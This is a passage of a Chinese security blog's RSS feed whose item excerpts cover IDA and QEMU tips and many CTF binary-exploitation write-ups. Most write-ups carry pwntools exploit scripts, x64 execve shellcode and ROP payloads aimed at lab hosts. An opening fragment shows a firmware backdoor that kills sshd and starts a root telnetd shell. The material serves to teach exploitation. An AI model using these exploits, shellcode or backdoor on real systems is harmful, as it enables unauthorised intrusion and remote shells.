同时，删除原来bin目录下的sh文件，替换为软连接指向busybox
rm -rf ./bin/shsudo ln -s /bin/busybox sh 接着我们写一个后门文件：
#include &amp;lt;stdio.h&amp;gt;void shell(){system(&amp;#34;/bin/busybox id&amp;#34;, 0, 0);system(&amp;#34;/bin/busybox killall sshd &amp;amp;&amp;amp; /bin/busybox telnetd -l /bin/sh -b 0.</description>
    </item>
    
    <item>
      <title>ida未正确识别数据类型</title>
      <link>https://jellyfish-pro.github.io/note/ida%E6%9C%AA%E6%AD%A3%E7%A1%AE%E8%AF%86%E5%88%AB%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/ida%E6%9C%AA%E6%AD%A3%E7%A1%AE%E8%AF%86%E5%88%AB%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <description>在ida中有事会出现如下情况：
可以看到这里正确的数据类型应该为word，但是ida并没有正确识别，而是将word识别为byte。
这时需要我们手动该更数据类型，快捷键按D。
更改后为：</description>
    </item>
    
    <item>
      <title>ida未识别到函数</title>
      <link>https://jellyfish-pro.github.io/note/ida%E6%9C%AA%E8%AF%86%E5%88%AB%E5%88%B0%E5%87%BD%E6%95%B0/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/ida%E6%9C%AA%E8%AF%86%E5%88%AB%E5%88%B0%E5%87%BD%E6%95%B0/</guid>
      <description>ida在识别mips和arm时，容易遇到未识别到函数的问题
看上去就是ida汇编显示红色：
这种情况就是ida没有自动识别到函数的边界，这时候就需要我们来指定。
首先选中边界点：
然后按如下顺序点击按钮
Edit -&amp;gt; Functions -&amp;gt; Create function 或者按快捷键p
随后ida就可以自动识别了</description>
    </item>
    
    <item>
      <title>mips下的rop</title>
      <link>https://jellyfish-pro.github.io/note/mips%E4%B8%8B%E7%9A%84rop%E5%AD%A6%E4%B9%A0/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/mips%E4%B8%8B%E7%9A%84rop%E5%AD%A6%E4%B9%A0/</guid>
      <description>关于mips下的rop学习 关于mips中rop链的查找 与x86下寻找rop不同，ROPgadget对于寻找mips的rop不太方便，所以这里我们就需要安装ida下的mipsfinder插件，具体的方法。
这里我们需要说明一些需要注意的地方：
我们不仅需要点击MIPS ROP Finder
还需要点击mips rop gadgets
不然会报错，找不到stackfinder()函数
计算偏移 //rop-test.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;sys/stat.h&amp;gt;#include &amp;lt;string.h&amp;gt;void do_system(int code,char *cmd){char buf[255];//sleep(1);system(cmd);}int main(){char buf[256]={0};char ch;int count = 0;unsigned int fileLen = 0;struct stat fileData;FILE *fp;if(0 == stat(&amp;#34;passwd&amp;#34;,&amp;amp;fileData))fileLen = fileData.st_size;elsereturn 1;if((fp = fopen(&amp;#34;passwd&amp;#34;,&amp;#34;rb&amp;#34;)) == NULL){printf(&amp;#34;Cannot open file passwd!</description>
    </item>
    
    <item>
      <title>mips交叉编译</title>
      <link>https://jellyfish-pro.github.io/note/mips%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/mips%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</guid>
      <description>mips中需要重点关注的几个寄存器 $a0-$a3进行传参 $sp为栈顶寄存器，$fp为栈底寄存器 $ra则存放返回地址 安装交叉连接工具 大段：
sudo apt-get install linux-libc-dev-mips-crosssudo apt-get install libc6-mips-cross libc6-dev-mips-crosssudo apt-get install binutils-mips-linux-gnu gcc-mips-linux-gnusudo apt-get install g++-mips-linux-gnu 小段：
sudo apt-get install linux-libc-dev-mipsel-crosssudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-crosssudo apt-get install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnusudo apt-get install g++-mipsel-linux-gnu 交叉编译 //mips_test.c#include &amp;lt;stdio.h&amp;gt;int main(void){print(&amp;#34;hello world&amp;#34;);return 0;} 接下来使用交叉编译工具编译
mips-linux-gnu-gcc mips_test.c -o test 需要注意的是，这样直接编译出来的结果是动态链接，所以直接使用qemu用户模式，会报错。
解决方法为使用qemu用户模式的-L参数，临时更换根目录：
qemu-mips-static -L /usr/mips-linux-gnu/ test 或者是使用静态编译：
mips-linux-gnu-gcc mips_test.c -static -o test </description>
    </item>
    
    <item>
      <title>nfs共享文件夹命令</title>
      <link>https://jellyfish-pro.github.io/note/nfs%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/nfs%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E5%91%BD%E4%BB%A4/</guid>
      <description>在一些设备上，比如海康威视，使用的是阉割的busybox，没有wget、curl，甚至没有nc
这时候可以选择使用nfs共享文件夹命令
使用之前需要进行安装：
sudo apt-get install nfs-kernel-server # 安装 NFS服务器端sudo apt-get install nfs-common # 安装 NFS客户端 随后打开服务：
sudo /etc/init.d/nfs-kernel-server start 或者 sudo /etc/init.d/nfs-kernel-server restart 使用如下命令可以查看nfs服务状态：
service nfs-server status 随后我们写配置文件：
sudo vim /etc/exports 将下面内容复制到配置文件中
/home/shangdi4sb/nfs *(rw,sync,no_root_squash,no_subtree_check) *代表了所有的网段都可以访问。
rw代表了可读可写。
这个我只使用nfs传递文件，故不对其他的几个参数做过多的解释。
sudo mount -t nfs 192.168.113.128:/home/shangdi4sb/nfs ./nfs 可以看到这个结构很简单，就不多解释了
如果显示挂载失败可以尝试*-o*参数
sudo mount -t nfs 192.168.113.128:/home/shangdi4sb/nfs ./nfs -o nolcok </description>
    </item>
    
    <item>
      <title>qemu-system桥接设置</title>
      <link>https://jellyfish-pro.github.io/note/qemu-system%E6%A1%A5%E6%8E%A5%E8%AE%BE%E7%BD%AE/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/qemu-system%E6%A1%A5%E6%8E%A5%E8%AE%BE%E7%BD%AE/</guid>
      <description>设置桥接的命令：
sudo ifconfig ens33 down # 先停用host的网卡sudo brctl addbr br0 # 添加名为br0的网桥sudo brctl addif br0 ens33 # 将host的网卡插到网桥br0上sudo brctl stp br0 off # 如果只有一个网桥，则关闭生成树协议sudo ifconfig br0 0.0.0.0 promisc up # 启用br0网桥，不分配ip，混杂模式sudo ifconfig ens33 0.0.0.0 promisc up # 启用host网卡，不分配ip，混杂模式sudo dhclient br0 # 让网桥从dhcp获取ipsudo tunctl -t tap0 # 创建一个tap网络设备，名字为tap0sudo brctl addif br0 tap0 # 将tap0插到网桥sudo ifconfig tap0 0.0.0.0 promisc up # 启用tap0，不分配ip，混杂模式 启动qemu-system的命令：</description>
    </item>
    
    <item>
      <title>qemu编译</title>
      <link>https://jellyfish-pro.github.io/note/qemu%E7%BC%96%E8%AF%91/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/qemu%E7%BC%96%E8%AF%91/</guid>
      <description>在ubuntu上直接使用 sudo apt install qemu安装qemu时，会遇到因为qemu版本过低导致模拟环境出现问题（例如：二进制文件是32位，但是在模拟出的环境中二进制文件的地址是8字节的情况）
为了避免这种情况，我们需要放弃apt安装，转而选择自行编译高版本的qemu。
我们可以在git的官网上下载最新版本的源码，或者在[仓库](Index of / (qemu.org))中寻找之前的版本，亦或者是在[官方的gitlab](QEMU / QEMU · GitLab)上寻找想要的版本
当我们拿到源码后，先安装依赖
sudo apt build-dep qemu 而后进入qemu源码文件夹进行配置：
./configure \--prefix= ~/qemu-user-static \ #这个选项是指定安装位置，我是直接安装到home目录下--static \ #指示静态链接--disable-system \ #不编译系统仿真程序--enable-linux-user #编译所有架构的用户态仿真程序 注意：
静态编译的时候需要指定&amp;ndash;disable-system选项，因为带softmmu 后缀的编译目标（即系统仿真程序）无论如何都会用到一些共享库，因此如果在指定了&amp;ndash;static选项但没有指定&amp;ndash;disable-system选项会导致后面的链接阶段报错。
编译，安装：
makemake install 最后给所有编译得到的目标重命名，为其添加一个&amp;quot;-static&amp;quot;后缀，这样qemu-debootstrap可以识别：
cd qemu-user-static/binfor i in *; do cp $i $i-static; done </description>
    </item>
    
    <item>
      <title>ret2csuinit_new</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2csuinit_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2csuinit_new/</guid>
      <description>首先利用checksec命令查看保护机制：
64位，没有canary检测，没有地址随机化，got表可写。
然后放进IDA里进行看一下反编译：
我们可以看到plt表中调用的是write函数。
这样我们就可以通过write函数泄露函数地址：
64位同样需要我们构造gadget。
我们利用pwntools的ROPgadget指令查找gadget：
ROPgadget --binary format_base --only &amp;#39;pop|ret&amp;#39; 我们知道write函数需要传递三个参数，但是通过上图，我们发现我们只能传递两个参数。
如果不能保证参数个数，那么我们就不能保证函数掉用的成功率。
所以这时候我们又需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。
_libc_csu_init函数因为特殊的汇编构造，可以帮助我们调用三个参数的函数。
首先我们看到这个函数的汇编代码（这里的汇编代码并不是题目的汇编代码，题目可能会和这里给出的有所差别，但是原理是一样的）：
这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。
将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 +rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。
.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx	//设定为0.text:000000000040061B pop rbp	//设定为1.text:000000000040061C pop r12	//放入需要调用的函数地址.text:000000000040061E pop r13	//放入第三个参数.text:0000000000400620 pop r14	//放入第二个参数.text:0000000000400622 pop r15	//放入第三个参数.text:0000000000400624 retn	//返回到0x400600.text:0000000000400600 mov rdx, r13	//第三个参数放入rdx.text:0000000000400603 mov rsi, r14	//第二个参数放入rsi.</description>
    </item>
    
    <item>
      <title>ret2csuinit_old</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2csuinit_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2csuinit_old/</guid>
      <description>首先查看具体信息：
在程序中也没有system和/bin/sh
栈也不是可读可写可执行。
那我们选择通过泄露函数地址，来查找libc版本：
那么问题又来了，这个程序没有puts函数，只有write函数，需要3个参数，而在x64我们需要用到rdi，rsi，rdx，而在程序中我们并没有找到pop_rdx。
这时候我们就需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。
首先我们看到这个函数的汇编代码：
这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。
将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 +rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。
.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx	//设定为0.text:000000000040061B pop rbp	//设定为1.text:000000000040061C pop r12	//放入需要调用的函数地址.text:000000000040061E pop r13	//放入第三个参数.text:0000000000400620 pop r14	//放入第二个参数.text:0000000000400622 pop r15	//放入第三个参数.text:0000000000400624 retn	//返回到0x400600.text:0000000000400600 mov rdx, r13	//第三个参数放入rdx.text:0000000000400603 mov rsi, r14	//第二个参数放入rsi.text:0000000000400606 mov edi, r15d	//第一个参数放入rdi.text:0000000000400609 call qword ptr [r12+rbx*8]//因为rbx为0，所以只有r12.</description>
    </item>
    
    <item>
      <title>ret2libc1_new</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc1_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc1_new/</guid>
      <description>首先查看基本信息：
可以看到PIE未开启，但NX打开了。
说明.text段的地址固定，但内存不可执行。
因为是64位程序，所以我们需要考虑构造gadget
拖入IDA查看一些基本信息：
看到在main函数中，有一个gets函数，gets函数接收字符串时碰到&amp;rsquo;\n&amp;rsquo;才会停止接收，通过这个特性我们就可以构造足够长的字符串，使得栈溢出，从而覆盖程序原本的栈，达到控制程序的目的。
计算从接收第一个字符到函数返回值之间的偏移量：
然后在IDA中用shift+f12,查看字符串：
得到/bin/sh的地址。
然后继续查看汇编，我们可以看到有一个call system的指令
那么我们的思路就是，通过padding溢出到ret，然后让ret返回到call system的地址，让system调用/bin/sh的地址，这样就能够get shell。
这/bin/sh的地址和system的地址都得到了，但是这是64位的文件，是通过寄存器，所以我们不能像32位一样将参数写入栈就不管了。
所以这里我们不能通过将/bin/sh的地址放进栈中，而是要使用ROP找到指令将/bin/sh的地址放入寄存器rdi中：
现在所有的要素都收集齐了，我们再理一下：
payload = flat([&amp;#39;a&amp;#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)]) #ret2libc1from pwn import *#p = process(&amp;#34;./ret2libc1&amp;#34;)p = remote(&amp;#39;10.0.25.109&amp;#39;,10005)sys_addr = 0x400687bin_addr = 0x601048pop_rdi_ret = 0x400793#p.recvuntil(&amp;#34;Hello, what&amp;#39;s your name?\n&amp;#34;)react = &amp;#34;Hello, what&amp;#39;s your name?\n&amp;#34;payload = flat([&amp;#39;a&amp;#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])#gdb.attach(p)#pause()#p.sendline(payload)p.sendlineafter(react,payload)p.interactive() </description>
    </item>
    
    <item>
      <title>ret2libc1_old</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc1_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc1_old/</guid>
      <description>首先查看相关信息
可以看到，32位，没有开启canary，没有开启PIE，但是打开了NX。
在IDA中我们可以看到system()函数：
得到system()函数地址之后，我们还需要得到/bin/sh字符的地址。
通过ROPgadget，我们可以查找到文件中是否存在/bin/sh字符：
现在system() 的地址，/bin/sh 的地址都有了。
接下来就是找到可利用的溢出点，算出到ret的偏移量：
利用cyclic生成200个字符：
shangdi4sb@ubuntu:~/pwntest/111$ cyclic 200aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab 用gdb打开ret2libc1，使用R命令让程序跑起来，输入生成的字符串，发现ret转跳到了奇怪的位置：
再利用cyclic计算偏移量：
shangdi4sb@ubuntu:~/pwntest/111$ cyclic -l 0x62616164112 现在我们知道了ret 的偏移量，知道了system()函数的地址，也知道了/bin/sh的地址，接下里就是需要将其连接到一起。
payload = &amp;#39;a&amp;#39; * 112 + system_addr + &amp;#39;b&amp;#39; * 4 + /bin/sh_addr #ret2libc1.pyfrom pwn import *p = remote(&amp;#34;10.0.25.109&amp;#34; , 10005)binsh_addr = 0x8048720system_addr = 0x08048460payload = flat([&amp;#39;a&amp;#39; * 112, system_addr, &amp;#39;b&amp;#39; * 4, binsh_addr])#注：因为system()函数在调用时，栈会向起传入4个字节当作system()函数的返回地址，所以构造4个b将其当作地址传给system()p.sendline(payload)p.interactive() </description>
    </item>
    
    <item>
      <title>ret2libc2_new</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc2_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc2_new/</guid>
      <description>首先使用checksec指令查看基本情况：
再放入ida进行查看：
可以看到并没有/bin/sh字符串，但是我们可以看到有gets函数和system函数
所以我们的思路就是两次利用gets函数，第一次利用gets对栈进行布置，第二次利用gets输入/bin/sh。
其中buf_addr是存放/bin/sh的地址，我们通过gdb中的vmmap指令可以查看哪一段代码是可写可读的：
所以我们将/bin/sh写在0x601000中
payload = b&amp;#39;a&amp;#39;*120 + p64(pop_rdi_ret) + p64(buf2_addr) + p64(gets_addr)payload += p64(pop_rdi_ret) + p64(buf2_addr) + p64(sys_addr) #ret2libc2_x64from pwn import*#p = process(&amp;#39;./ret2libc2&amp;#39;)p = remote(&amp;#39;10.0.25.109&amp;#39;,10006)if args.G:gdb.attach(p)pause()sys_addr = 0x400570gets_addr = 0x400580pop_rdi_ret = 0x400793pop_rsi = 0x400791buf2_addr = 0x601000context.log_level = &amp;#39;debug&amp;#39;payload = b&amp;#39;a&amp;#39;*120 + p64(pop_rdi_ret) + p64(buf2_addr) + p64(gets_addr)payload += p64(pop_rdi_ret) + p64(buf2_addr) + p64(sys_addr) p.</description>
    </item>
    
    <item>
      <title>ret2libc2_old</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc2_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc2_old/</guid>
      <description>首先查看基本信息：
开启了NX 保护，说明内存不可执行，但是对这道题来说，并不重要
拖入IDA中查看代码：
可以看到有gets函数。
到这里我们的思路就和ret2libc1的思路一样，找到溢出点，计算ret的偏移量，将ret指向system函数，再使用system函数运行/bin/sh。
随后我们查看文件中是否有system函数：
有system函数，然后查看是否有/bin/sh：
但我们在文件中，并没有找到/bin/sh。
我们现在找到了gets函数、system函数、但并没有找到/bin/sh。
这种情况我们就可以选择调用gets函数，将我们自己输入的/bin/sh存放到.bss段：
BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。可执行程序包括BSS段、数据段、代码段。 大概思路就是，我们先填充字符，填充掉第一次gets存放的地址，然后再让gets的返回值返回到gets函数开头，再次条用gets，这时输入shellcode，让gets将shellcode存放到.bss段，然后返回system函数，调用shellcode。
计算gets函数ret的偏移量
payload = flat([&amp;#34;a&amp;#34;*112,gets,system,buf2,buf2]) #ret2libc2from pwn import *p = remote(&amp;#34;10.0.25.109&amp;#34;,10006)sys_addr = 0x8048490gets_addr = 0x8048460buf2_addr = 0x804A080payload = flat([&amp;#34;a&amp;#34;*112,gets_addr,sys_addr,buf2_addr,buf2_addr])p.sendline(payload)p.sendline(&amp;#39;/bin/sh&amp;#39;)p.interactive() </description>
    </item>
    
    <item>
      <title>ret2libc3_new</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc3_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc3_new/</guid>
      <description>首先查看基本信息：
v1 大小为 0x70，ret 大小为 8，故 padding 为 0x78
然后查看/bin/sh 和 system：
并没有/bin/sh 和 system。
搜索 syscall 也没有找到
这种情况下我们只能选择泄露函数地址，查找 libc.so 版本来调用函数了。
通过 IDA 查看伪代码，我们可以看到程序调用 puts 函数和 setbuf 函数，于是我们选择泄露 这俩函数的地址来查找 libc 的版本：
from pwn import *context.log_level = &amp;#39;debug&amp;#39;p = remote(&amp;#39;10.0.25.109&amp;#39;,10007)#p = process(&amp;#39;./ret2libc3&amp;#39;)if args.G:gdb.attach(p)pause()elf = ELF(&amp;#39;./ret2libc3&amp;#39;)main = 0x4006AEpop_rdi_ret = 0x400743puts_addr = 0x400695pop_rsi_r15_ret = 0x400741payload = b&amp;#39;a&amp;#39;*120+p64(pop_rdi_ret) + p64(elf.got[&amp;#39;puts&amp;#39;]) payload += p64(elf.</description>
    </item>
    
    <item>
      <title>ret2libc3_old</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc3_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc3_old/</guid>
      <description>首先查看文件基本属性：
看到文件并没有开启PIE，所以代码段的地址是相对固定的。
然后查看是否有system函数和/bin/sh
可以看到并没有system函数，也没有/bin/sh
搜索int 0x80也可以看到并没有：
没有int 0x80也不能调用execve函数
虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：
可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so
libc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。
那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。
现在我们使用puts函数举例：
​	当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。
所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：
payload = b&amp;#39;a&amp;#39;*(0x6c+4) //padding+p32(elf.plt[&amp;#39;puts&amp;#39;]) //使函数转跳到puts函数+p32(main)	//puts函数的返回值+p32(elf.got[&amp;#39;puts&amp;#39;]) //利用puts函数输出puts函数的gots表上的地址 上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：
puts=u32(p.recv(4))	//将接收到的地址放入puts中print(&amp;#39;puts&amp;#39;,hex(puts))	libc =LibcSearcher(&amp;#39;puts&amp;#39;,puts)	//在libcsearcher中寻找puts函数的偏移量libcbase=puts-libc.dump(&amp;#39;puts&amp;#39;)	//计算基址system=libcbase+libc.dump(&amp;#39;system&amp;#39;)	//计算出system函数的真实地址bin_sh=libcbase+libc.dump(&amp;#39;str_bin_sh&amp;#39;)	///bin/sh的真实地址print(&amp;#39;system&amp;#39;,hex(system))print(&amp;#39;binsh&amp;#39;,hex(bin_sh)) 在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法
因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：
payload2=b&amp;#39;a&amp;#39;*(0x64+4)+p32(system)+p32(0xdeadbeef)+p32(bin_sh) from pwn import *from LibcSearcher import *#context.log_level = &amp;#39;debug&amp;#39;p = remote(&amp;#39;10.0.25.109&amp;#39;,10007)#p = process(&amp;#39;./ret2libc3&amp;#39;)elf = ELF(&amp;#39;./ret2libc3&amp;#39;)main = 0x08048618if args.G:gdb.attach(p)payload = b&amp;#39;a&amp;#39;*(0x6c+4)+p32(elf.</description>
    </item>
    
    <item>
      <title>ret2resolve1</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2resolve1/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2resolve1/</guid>
      <description>首先查看基本情况：
在IDA里我们可以看到main函数和产生溢出的函数：
我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。
那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。
首先我们需要泄露服务器端的函数地址：
from pwn import *context.log_level = &amp;#39;debug&amp;#39;p = remote(&amp;#39;10.0.25.109&amp;#39;,10009)elf = ELF(&amp;#39;ret2resolve&amp;#39;)#p = process(&amp;#39;./ret2resolve&amp;#39;)if args.G:gdb.attach(p)payload = 112 * b&amp;#39;a&amp;#39;payload += p32(elf.plt[&amp;#39;write&amp;#39;])payload += p32(elf.symbols[&amp;#39;main&amp;#39;])payload += p32(1)payload += p32(elf.got[&amp;#39;write&amp;#39;])payload += p32(4)payload += p32(elf.symbols[&amp;#39;main&amp;#39;])p.sendline(payload)write_addr = u32(p.recvuntil(&amp;#39;\xf7&amp;#39;)[-4:])#write_addr = u32(p.recv(4))print(&amp;#39;write_addr =&amp;#39;,hex(write_addr)) 运行脚本后，就可以打印出write函数的地址：
可以看到，函数的后12位是460。
然后修改一下上面的脚本，我们可以输出一些其他的函数：
我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/
这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：
libcbase = write_addr - 0xd44d0system = libcbase + 0x3a950binsh = libcbase + 0x15912bpayload = 112 * b&amp;#39;a&amp;#39;payload += p32(system)payload += p32(0xdeadbeef)payload += p32(binsh)sh.</description>
    </item>
    
    <item>
      <title>ret2shellcode</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2shellcode/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2shellcode/</guid>
      <description>首先查看基本情况：
ida中也没有看到system和/bin/sh
可以看到栈可执行，我们需要判断是jmp rsp还是输入shellcode：
在IDA中我们可以看到read函数可以输入0x40个字符，但buf却只存取8个字符，所以我们有0x38个字符可以输入，这个长度我们可以使用shellcode
shellcode = &amp;#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;#39; 又因为程序开启了PIE，我们需要计算shellcode的地址：
p.recvuntil(&amp;#39;[&amp;#39;) buf_addr = p.recvuntil(&amp;#39;]&amp;#39;,drop=True) 这样就可以计算出存放字符的起始地址
然后构造payload：
payload = flat([&amp;#39;a&amp;#39;*16,p64(int(buf_addr,16)+8+8+8),shellcode])//‘a’*16：填充字符&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD//p64(int(buf_addr,16)+8+8+8)：buf_addr的起始地址+read函数读取的8位+rbp的填充+shellcode的8位地址=======//p64(int(buf_addr,16)+8+8+8)：buf_addr的起始地址+read函数读取的8位+leave使用掉的8位+shellcode的8位地址//leave = mov esp,ebp;pop ebp&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; origin/dev #ret2shellcode_x64from pwn import *#p = process(&amp;#34;./ret2shellcode&amp;#34;)p = remote(&amp;#34;10.0.25.109&amp;#34;,10000)shellcode = &amp;#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;#39;p.recvuntil(&amp;#39;:&amp;#39;)buf_addr = p.recvuntil(&amp;#39;\n&amp;#39;,drop=True)payload = flat([&amp;#39;a&amp;#39;*16,p64(int(buf_addr,16)+8+8+8),shellcode])p.sendline(payload)p.interactive() </description>
    </item>
    
    <item>
      <title>ret2syscall</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2syscall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2syscall/</guid>
      <description>注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。 首先先检查一下保护机制：
可以看到，没有开启栈溢出保护和随机地址。
那么我们可以考虑泄露函数地址，查找libc版本，但是使用file指令查看文件的编译信息，我们就会发现：
这个文件是开启了静态编译的。
文件是动态编译时，才会使用到libc。如果时静态编译，则会将所有需要的函数都放到文件内部。
我们使用IDA，就可以直观的感受到：
我们可以看到，在文件中有很多函数，并且函数的名称也被隐藏了的。
然后我们查看是否有/bin/sh字符：
通过查找，可以看到在程序中确实有/bin/sh字符串。
虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便 可以看到我们想要的gadget都有
这道题的思路就是：
通过调用号，调用exec函数（64位的调用号为0x3b，32位程序的调用号位0xb），然后构造gadget将/bin/sh输入进exec函数，最后让程序跳转到syscall指令（32位程序的调用号位int 0x80）。
#payload.pyfrom pwn import *#p=process(&amp;#34;./ret2syscall&amp;#34;)p = remote(&amp;#39;10.0.25.109&amp;#39;,10004)if args.G:gdb.attach(p)pop_eax_ret = 0x4005afpop_rdi_ret = 0x4006a6pop_rsi_ret = 0x4100f3pop_rdx_ret = 0x448ee5bin_addr = 0x492364syscall = 0x40126cpayload = flat([&amp;#39;a&amp;#39;*120,pop_eax_ret,&amp;#39;\x00&amp;#39;*4,0x3b,&amp;#39;\x00&amp;#39;*4,pop_rdi_ret,&amp;#39;\x00&amp;#39;*4,bin_addr,&amp;#39;\x00&amp;#39;*4,pop_rsi_ret,&amp;#39;\x00&amp;#39;*12,pop_rdx_ret,&amp;#39;\x00&amp;#39;*12,syscall])#payload = b&amp;#39;a&amp;#39;*120 + p64(pop_eax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(bin_addr)#payload += p(pop_rsi_ret) + &amp;#39;\x00&amp;#39;*8 + p64(pop_rdx_ret) + &amp;#39;\x00&amp;#39;*8 + p64(syscall)p.</description>
    </item>
    
    <item>
      <title>ret2text</title>
